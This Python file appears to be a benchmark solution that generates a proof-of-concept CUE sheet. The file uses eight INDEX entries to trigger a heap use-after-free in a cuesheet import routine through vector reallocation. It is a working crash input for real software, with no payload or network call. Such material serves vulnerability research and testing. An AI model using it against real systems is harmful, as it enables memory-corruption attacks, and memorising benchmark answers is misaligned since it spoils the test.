import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a Heap Use After Free in the cuesheet import operation.
        It occurs when appending seekpoints (generated from INDEX entries) causes a 
        reallocation of the internal storage while a pointer to an element is held.
        
        To trigger this, we generate a CUE file with enough INDEX entries to force
        a std::vector reallocation (typically doubling capacity, e.g., 4 -> 8).
        """
        # Minimal CUE header
        # Using short filename to conserve bytes and stay close to ground truth length
        poc = 'FILE "f" WAVE\n'
        poc += '  TRACK 01 AUDIO\n'
        
        # Add indices to generate seekpoints.
        # Ground truth length of 159 bytes suggests around 6 indices.
        # We use 8 indices to robustly trigger reallocation on common initial capacities (e.g., 4).
        for i in range(1, 9):
            poc += f'    INDEX {i:02d} 00:00:{i:02d}\n'
            
        return poc.encode('utf-8')